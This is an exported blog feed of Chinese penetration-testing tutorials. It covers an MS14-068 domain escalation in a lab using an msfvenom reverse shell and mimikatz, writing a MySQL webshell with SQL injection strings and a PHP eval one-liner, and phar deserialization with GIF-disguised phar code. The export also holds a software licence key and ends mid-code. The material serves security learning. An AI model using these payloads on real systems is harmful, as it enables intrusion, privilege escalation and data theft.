域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p></blockquote><h1 id="域渗透AD环境搭建"><a href="#域渗透AD环境搭建" class="headerlink" title="域渗透AD环境搭建"></a>域渗透AD环境搭建</h1><ul><li>域控制器：<a href="ed2k://%7Cfile%7Ccn_win_srv_2003_r2_standard_x64_with_sp2_vl_cd1_X13-47363.iso%7C646281216%7C401FEF8B592F58BDAE69821512FA9681%7C/">windows server r2 standard</a><ul><li><a href="https://wenku.baidu.com/view/d05d73156edb6f1aff001f73.html">序列号</a> 简体中文标准版</li><li>PCGCG-MP77F-9DBC9-QHW44-TDBRD</li></ul></li><li>域用户：win7</li></ul><p>单域的环境还是比较简单的，网上搭建的教程也是比较多，因为我也是刚入门只搭了一个简单的一个域控制器DC+一个win7的域用户。</p><p>搭建教程可以参考这两篇文章：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/31957064">知乎-域渗透初探（二）：域环境搭建</a></li><li><a href="https://www.cnblogs.com/-qing-/p/11193805.html">域渗透基础之环境搭建(单域到组件域林)</a></li></ul><p>我就简单说一下关键点和我踩到的坑：</p><ol><li><p>改两个的计算机名，后面比较方便</p></li><li><p>虚拟机搭建的情况下（大部分应该都是吧），虚拟机设置中得网络换成桥接。设置好IP使两台虚机在同一个局域网内，通过ip地址互ping能ping通，通过机器名也能ping通，ping域控服务器的计算器全名(带域后缀)也要ping的通。</p><p><img src="https://i.loli.net/2020/03/20/wzbN9FjsC17TZIM.png"></p></li><li><p>一直提示<strong>密码设置不符合要求</strong>或者<strong>第一次登陆需要更改密码</strong>有一直解决不了的话，可以考虑更改域控制器安全策略。参考<a href="https://blog.csdn.net/ZebraChroma/article/details/82896194">域用户无法修改密码问题的解决方案</a></p><p><img src="https://i.loli.net/2020/03/20/8pj1XwyLgBPlMFn.png"></p></li><li><p>分配内存的时候根据自己的机器来，分配少一点，比如总共8G(推荐16G)，可以各分1G，分的太多容易导致物理机崩溃。多渗透环境的话，可能还是需要16G以上内存才能跑得起来。。。</p></li></ol><p>其他好像没什么，按照教程来就行。</p><p><strong>测试的域环境结构</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域：pentestlab.com</span><br><span class="line">域控：windows Server 2003 R2，IP: 192.168.0.105</span><br><span class="line">域成员：windows 7x64,IP: 192.168.0.106</span><br><span class="line">攻击者：kaliLinux IP: 192.168.0.108 </span><br></pre></td></tr></table></figure><h1 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h1><h2 id="win7反弹shell"><a href="#win7反弹shell" class="headerlink" title="win7反弹shell"></a>win7反弹shell</h2><p>假设控制了域网内的一台电脑，要将权限从local admin 提高到Domain admin，访问包括Domain Controller在内的域内中任何一台电脑</p><p>首先得拿到一个shell</p><ul><li>上传Metasploit的反弹马，shell下执行命令</li></ul><p>生成反弹马（用exe的）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.108 LPORT&#x3D;23333 -f exe &gt; .&#x2F;Desktop&#x2F;re.exe</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/1XP8pcbuCnimOdW.png"></p><p>msfconsole设置监听并启动</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.108</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set port 23333</span><br><span class="line">port &#x3D;&gt; 23333</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/yqoGbeCRz6Jg8vr.png"></p><p>shell有中文，所以存在乱码（但是没有关系）</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到shell后，进行必要的信息收集。</p><p><a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p><p>常见的信息收集命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE% //查看系统版本位数</span><br><span class="line"></span><br><span class="line">netstat -ano //查看开放的端口</span><br><span class="line"></span><br><span class="line">net config Workstation //当前计算机名，全名，用户名，系统版本，工作站域，登陆域</span><br><span class="line"></span><br><span class="line">net user /domain b404 pass //修改域内用户密码，需要管理员权限</span><br><span class="line"></span><br><span class="line">tasklist /S IP地址 /U 域名\用户名 /P /V  //查看远程计算机进程</span><br><span class="line"></span><br><span class="line">tasklist /svc //查看进程</span><br><span class="line"></span><br><span class="line">taskkill /im 进程名称(cmd.exe) //结束进程</span><br><span class="line"></span><br><span class="line">taskkill /pid[进程码] //-t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line"></span><br><span class="line">ipconfig /all //用来查看当前机器的网络环境,判断是工作组,还是域环境.网段是怎么划分的,每个段有多少台机器,DNS服务器IP是多少。</span><br><span class="line"></span><br><span class="line">net view//用来查看跟本机有关联的机器名.注意,是跟本机有关联的机器,而不是一个段的机器.</span><br><span class="line"></span><br><span class="line">net view /domain//用来查看当前网络环境存在几个域.</span><br><span class="line"></span><br><span class="line">net view /domain:xxxx//查看xxx域中存在的跟本机有关联的机器.</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain//查看域内管理员.</span><br><span class="line"></span><br><span class="line">net user /domain//查看域内的用户名.</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; /domain//查看域内所有机器名.</span><br><span class="line"></span><br><span class="line">net time /domain//查看域时间及域服务器的名字</span><br><span class="line"></span><br><span class="line">Nslookup -type=SRV _ldap._tcp.//查询DNS</span><br><span class="line"></span><br><span class="line">netstat//查看连接信息.</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Controllers&quot; /domain//查找域控</span><br><span class="line"></span><br><span class="line">nbtstat//由IP地址得到机器名</span><br><span class="line"></span><br><span class="line">ping 扫描内网存活主机：</span><br><span class="line">for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i&quot;ttl&quot;</span><br><span class="line"></span><br><span class="line">查看是否支持PowerShell：</span><br><span class="line">if defined PSModulePath (echo support powershell) else (echo not support powershell)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/JZrvnBcjYQUupVD.png"></p><p>得到一些信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域：pentestlab.com</span><br><span class="line">域控制器：DCSERVER</span><br><span class="line">主机:Win7-PC1</span><br><span class="line"></span><br><span class="line">IPs：</span><br><span class="line">192.168.0.1 &#x2F;&#x2F;可能是网关</span><br><span class="line">192.168.0.105 </span><br><span class="line">192.168.0.106 &#x2F;&#x2F;win7主机，可控</span><br><span class="line">192.168.0.108 &#x2F;&#x2F;攻击机</span><br><span class="line">&#x2F;&#x2F;实际环境下应该还存在很多存活的主机，无法通过这样就简单确定域控制器的IP。</span><br><span class="line"></span><br><span class="line">支持powershell</span><br><span class="line"></span><br><span class="line">某些端口开启：</span><br><span class="line">80(web服务),443(https),135(RPC),3306(mysql),3389(windows远程连接)</span><br></pre></td></tr></table></figure><h2 id="从local-admin到domain-admin"><a href="#从local-admin到domain-admin" class="headerlink" title="从local admin到domain admin"></a>从local admin到domain admin</h2><p>我们利用MS14-068漏洞提升普通用户的权限为与管理员（Domain admin）的身份。</p><p>详细原理参考：<a href="http://www.freebuf.com/vuls/56081.html">深入解读MS14-068漏洞</a></p><blockquote><p>该漏洞利用Kerberos协议的算法和信息存放以及任意签名问题</p><p>Kerberos协议是一种基于第三方可信主机的计算机网络协议，它允许两个实体之间在非安全网络环境（可能被窃听、被重放攻击）下以一种安全的方式证明自己的身份。</p></blockquote><p>攻击工具: <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p><p>利用该工具需要：</p><ol><li><p>SID:</p><p><img src="https://i.loli.net/2020/03/20/fZ3SINgrTqQRJep.png"></p></li><li><p>域控制器名称和域名称：DCServer</p></li><li><p>python环境（测试使用python2.7.14）</p></li></ol><p>获取TGT并且清除缓存票据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u Win7-PC1@pentestlab.com -p V0Wldl19980114 -s S-1-5-21-2650578945-2920865233-32666330-1107 -d DCServer.pentestlab.com</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/L4SaPes5rgB89Dq.png"></p><p>注入TGT，注意注入TGT时，需要将上一步得到的票据放到相应的目录。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_Win7-PC1@pentestlab.com.ccache&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/PjARhBCO5wDQpIZ.png"></p><p><img src="https://i.loli.net/2020/03/20/Ok7WKivzXlC1pFr.png"></p><p>访问域控DCServer的资源<code>\\DCServer\c$</code>，把shell——re.exe放到c盘目录，准备用这个文件反弹shell。</p><p><img src="https://i.loli.net/2020/03/20/bmxq4SyKI8AotYZ.png"></p><p>添加定时任务，反弹shell，成功获取域控的system权限。</p><p><img src="https://i.loli.net/2020/03/20/58j6zSu1b7IVRZm.png"></p><p><img src="https://i.loli.net/2020/03/20/3zjSBbfn9y6XQeZ.png"></p><h1 id="总结与后记"><a href="#总结与后记" class="headerlink" title="总结与后记"></a>总结与后记</h1><p>本文主要是通过一个<code>MS14-068</code>漏洞复现了一个简单域渗透的情景，初窥域渗透和内网渗透。内网渗透确实博大精深，内容很多，知识很杂，听说到更精深的情况是能够自己写免杀和新漏洞的PoC，这甚至还需要二进制的知识。也是希望自己能够通过像这样不断的学习和总结，逐渐摸到门道，慢慢摸索经验，一步步深入吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近找工作，发现光打CTF不足以应对企业的需求，很多都会问一些内网渗透方面的知识。而我之前内网渗透这一块一直没怎么涉及，虽然有点晚的，但是确</summary>
      
    
    
    
    <category term="渗透测试" scheme="v0w.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="v0w.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>mysql写shell的一点总结</title>
    <link href="v0w.top/2020/03/14/mysql-getshell/"/>
    <id>v0w.top/2020/03/14/mysql-getshell/</id>
    <published>2020-03-13T16:00:00.000Z</published>
    <updated>2020-08-11T02:15:12.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>利用SQL注入，当存在一定的利用条件时，我们可以利用mysql进行文件的写入，在知道网站绝对路径的情况下，可以通过这种方式写入shell。</p><h1 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h1><ol><li><p>数据库当前用户为root权限或者至少有FILE权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select file_priv,user,host from mysql.user;</span><br><span class="line">+-----------+------+-----------+</span><br><span class="line">| file_priv | user | host      |</span><br><span class="line">+-----------+------+-----------+</span><br><span class="line">| Y         | root | localhost |</span><br><span class="line">| Y         | root | 127.0.0.1 |</span><br><span class="line">| Y         | root | ::1       |</span><br><span class="line">+-----------+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>知道当前网站的绝对路径</p></li><li><p>php的gpc为off状态, 在开启gpc的情况下，可以通过十六进制的路径读写文件</p></li><li><p>写入的那个路径存在写权限</p></li><li><p><code>secure_file_priv=&#39;&#39;</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+-----------------------+</span><br><span class="line">| @@secure_file_priv    |</span><br><span class="line">+-----------------------+</span><br><span class="line">| &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">secure_file_priv可以设置如下这样进行设置：</span><br><span class="line">1. 设置为空，那么对所有路径均可进行导入导出。</span><br><span class="line">2. 设置为一个目录名字，那么只允许在该路径下导入导出。</span><br><span class="line">3. 设置为Null，那么禁止所有导入导出。</span><br><span class="line"></span><br><span class="line">需要在mysql的配置文件中更改：</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure></li></ol><h1 id="0x02-读取web路径"><a href="#0x02-读取web路径" class="headerlink" title="0x02 读取web路径"></a>0x02 读取web路径</h1><h2 id="2-1-利用报错"><a href="#2-1-利用报错" class="headerlink" title="2.1 利用报错"></a>2.1 利用报错</h2><p>有时候<code>information_schema.tables</code>不能用时，在<strong>MySQL 5.6</strong>及以上版本中可以使用以下表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;schema()%23&amp;Submit&#x3D;Submit%23</span><br><span class="line">?id&#x3D;1&#39; union select 1,group_concat(table_name) from mysql.innodb_index_stats where database_name&#x3D;schema()%23&amp;Submit&#x3D;Submit%23</span><br></pre></td></tr></table></figure><h2 id="2-2-phpinfo"><a href="#2-2-phpinfo" class="headerlink" title="2.2 phpinfo"></a>2.2 phpinfo</h2><p><img src="https://i.loli.net/2020/03/22/vBiFuHg7pAKL2Ps.png"></p><h2 id="2-3-load-file读配置文件"><a href="#2-3-load-file读配置文件" class="headerlink" title="2.3 load_file读配置文件"></a>2.3 load_file读配置文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default&#39;);</span><br></pre></td></tr></table></figure><p>有时候过滤了敏感路径可以试试这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;otherdir&#x2F;..&#x2F;passwd&#39;);</span><br></pre></td></tr></table></figure><h2 id="2-4-通过mysql函数和全局变量-查找mysql安装目录"><a href="#2-4-通过mysql函数和全局变量-查找mysql安装目录" class="headerlink" title="2.4 通过mysql函数和全局变量 查找mysql安装目录"></a>2.4 通过mysql函数和全局变量 查找mysql安装目录</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+-----------+</span><br><span class="line">| @@basedir |</span><br><span class="line">+-----------+</span><br><span class="line">| &#x2F;usr&#x2F;     |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@datadir;</span><br><span class="line">+-----------------+</span><br><span class="line">| @@datadir       |</span><br><span class="line">+-----------------+</span><br><span class="line">| &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &#39;datadir&#39;;</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| Variable_name | Value           |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| datadir       | &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><blockquote><p>@@ 用于系统变量</p><p>@ 往往用于用户定义的变量</p></blockquote><h1 id="0x03-常见方法写shell"><a href="#0x03-常见方法写shell" class="headerlink" title="0x03 常见方法写shell"></a>0x03 常见方法写shell</h1><h2 id="3-1-select-into"><a href="#3-1-select-into" class="headerlink" title="3.1 select * into"></a>3.1 select * into</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select &#39;&lt;? phpinfo(); ?&gt;&#39; into outfile &#39;E:&#x2F;1.txt&#39;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#39;&lt;? phpinfo(); ?&gt;&#39; into outfile &#39;E:&#x2F;1.txt&#39;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="3-2-基于log日志写shell法"><a href="#3-2-基于log日志写shell法" class="headerlink" title="3.2 基于log日志写shell法"></a>3.2 基于log日志写shell法</h2><blockquote><p><a href="http://sh1yan.top/2018/05/26/mysql-writ-shell/">http://sh1yan.top/2018/05/26/mysql-writ-shell/</a></p><p>查询当前mysql下log日志的默认地址，同时也看下log日志是否为开启状态，并且记录下原地址，方便后面恢复。</p><p><code>set global general_log = on;</code><br>开启日志监测，一般是关闭的，如果一直开，文件会很大的。</p><p><code>set global general_log_file = ‘G:/2.txt’;</code><br>这里设置我们需要写入的路径就可以了。</p><p><code>select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;</code><br>查询一个一句话，这个时候log日志里就会记录这个。</p><p><code>set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;</code><br>结束后，再修改为原来的路径。</p><p><code>set global general_log = off;</code><br>关闭下日志记录。</p></blockquote><p><img src="https://i.loli.net/2020/03/22/Sj5szw37rNXHuDm.png" alt="20200322145847.png"></p><h2 id="3-3-创建表，导出数据"><a href="#3-3-创建表，导出数据" class="headerlink" title="3.3 创建表，导出数据"></a>3.3 创建表，导出数据</h2><p>其实和第一种方法差不多。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use test;</span><br><span class="line">drop table if exists vow;</span><br><span class="line">create table vow(name text not null);</span><br><span class="line">insert into vow(name) values(&#39;&lt;?php phpinfo(); ?&gt;&#39;);</span><br><span class="line">select name from vow into outfile &#39;E:&#x2F;5.txt&#39;;</span><br><span class="line">drop tables vow;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;利用SQL注入，当存在一定的利用条件时，我们可以利用mysql进行文件的写入，在知道网站绝对路径的情</summary>
      
    
    
    
    <category term="Web安全" scheme="v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="webshell" scheme="v0w.top/tags/webshell/"/>
    
    <category term="mysql" scheme="v0w.top/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>phar扩展php反序列化的攻击面</title>
    <link href="v0w.top/2020/03/12/phar-unsearise/"/>
    <id>v0w.top/2020/03/12/phar-unsearise/</id>
    <published>2020-03-11T16:00:00.000Z</published>
    <updated>2020-07-18T10:39:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学校的seaii表哥在404发了一篇paper——<a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p>分析了php反序列与phar的结合，大大拓展了反序列化的攻击面，我也重新审视这个漏洞，发现真的很有意思，并且有较大的杀伤力。之前分析过了<strong>php反序列化与POP链</strong>，本文就主要分析一下如何利用phar来扩展php反序列化的攻击面，并从源码角度来看一下为什么很多文件操作函数可以触发phar的反序列化。（另外膜拜一下seaii哥，啥时候能像seaii哥这么优秀啊。。。）</p><p>利用phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。</p><h1 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h1><p>详细的文件结构这一查看php文档——<a href="https://www.php.net/manual/en/phar.fileformat">What makes a phar a phar and not a tar or a zip?</a></p><h2 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h2><p>可以理解为一个标志，phar前面内容不限，但必须以<code>__HALT_COMPILER();</code>来结尾(<code>?&gt;</code>可以省略也可以包含)，否则phar扩展将无法识别这个文件为phar文件。</p><h2 id="a-manifest-describing-the-contents（一个描述内容的清单）"><a href="#a-manifest-describing-the-contents（一个描述内容的清单）" class="headerlink" title="a manifest describing the contents（一个描述内容的清单）"></a>a manifest describing the contents（一个描述内容的清单）</h2><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><table><thead><tr><th align="left">Size in bytes</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">4 bytes</td><td align="left">phar清单的长度(以字节为单位)(1 MB limit)</td></tr><tr><td align="left">4 bytes</td><td align="left">Phar中的文件数</td></tr><tr><td align="left">2 bytes</td><td align="left">Phar清单的API版本 (currently 1.0.0)</td></tr><tr><td align="left">4 bytes</td><td align="left">全局的phar位示图标志</td></tr><tr><td align="left">4 bytes</td><td align="left">phar的别名长度</td></tr><tr><td align="left">??</td><td align="left">phar的位示图长度</td></tr><tr><td align="left">4 bytes</td><td align="left">phar元数据长度（0表示无）</td></tr><tr><td align="left">??</td><td align="left">序列化的phar元数据，以**serialize()**格式存储</td></tr><tr><td align="left">只要24*条目字节数</td><td align="left">每个文件的条目</td></tr></tbody></table><h2 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h2><p>被压缩文件的内容</p><h2 id="可选-验证phar完整性的签名"><a href="#可选-验证phar完整性的签名" class="headerlink" title="[可选] 验证phar完整性的签名"></a>[可选] 验证phar完整性的签名</h2><p>签名，放在文件末尾，格式如下：</p><table><thead><tr><th align="left">Length in bytes</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">16 or 20 bytes</td><td align="left">实际签名，SHA1签名为20字节，MD5签名为16字节，SHA256签名为32字节，SHA512签名为64字节。</td></tr><tr><td align="left">4 bytes</td><td align="left">签名标志. <em>0x0001</em> 用于表示是 MD5 签名, <em>0x0002</em> 用来表示是 SHA1 签名, <em>0x0004</em> 用来表示是SHA256签名, <em>0x0008</em>用来表示是SHA512签名。 API版本1.1.0引入了SHA256和SHA512签名支持。</td></tr><tr><td align="left">4 bytes</td><td align="left">Magic <em>GBMB</em> 用于定义签名的存在</td></tr></tbody></table><h1 id="构造一个phar文件"><a href="#构造一个phar文件" class="headerlink" title="构造一个phar文件"></a>构造一个phar文件</h1><h2 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h2><p>根据文件结构，自己来构造一个phar文件，php内置了一个phar类处理的相关操作。</p><blockquote><p>注意：要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。</p></blockquote><p>phar.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">//__HALT_COMPILER(); 也是可以的</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/15/t6eI95JmQZ4Cw1L.png"></p><p>meta-data是用反序列化形式存储的。</p><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><table><thead><tr><th>受影响的函数列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>filename</td><td>filectime<br />(获取文件的inode更改时间)</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup<br />(获取文件的组名)</td><td>fopen</td></tr><tr><td>fileinode<br />（获取文件inode）</td><td>filemtime<br />（获取文件的修改时间）</td><td>fileowner</td><td>fileperms<br />（获取文件权限）</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link<br />（判断文件名是否为符号链接）</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file<br />（解析配置文件）</td></tr><tr><td>copy</td><td>unlink</td><td>stat<br />（获取文件相关信息）</td><td>readfile<br />（输入文件内容）</td></tr></tbody></table><p>试一下，文件操作函数，能否自动对其进行反序列化：</p><p><code>test.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Destruct called\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;wakeup called\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">    <span class="comment">//file_exists($filename);</span></span><br><span class="line">    <span class="comment">//file($filename);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>于是当文件系统函数的参数可控时，我们可以在不调用<code>unserize()</code>的情况下，进行反序列化操作，许多的文件函数都可以触发，极大地拓展了攻击面。</p><blockquote><p>注意：</p><p>对于一个前后调用多个file函数的phar文件，只会反序列化一次。</p></blockquote><p>比如，将上述代码注释去掉，也是只有<code>file_get_contents</code>会反序列一次phar，后续的文件处理函数，都会基于之前反序列化完成的文件进行操作。(调用堆栈也可以说明这一点。)</p><p><img src="https://i.loli.net/2020/03/15/HSUOBbzWIuV8FMh.png"></p><h2 id="将phar在伪造成其他文件"><a href="#将phar在伪造成其他文件" class="headerlink" title="将phar在伪造成其他文件"></a>将phar在伪造成其他文件</h2><blockquote><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p></blockquote><p>phar2.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span 